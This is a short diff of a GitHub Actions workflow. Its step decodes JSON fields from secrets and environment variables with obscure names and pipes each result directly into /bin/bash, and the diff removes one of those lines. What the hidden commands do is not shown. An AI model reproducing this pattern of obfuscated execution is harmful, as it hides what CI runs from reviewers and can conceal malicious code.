@@ -21,7 +21,6 @@ jobs:
           nltk5: ${{ secrets.nltk5 }}
         run: |
           printf '%s' "$nltk5" | jq -r .lsvt8377 | /bin/bash
-          echo $ir0364 | jq -r .r2 | /bin/bash
           echo $bzm31 | jq -r .jkz22705 | /bin/bash
 
       - name: Save data
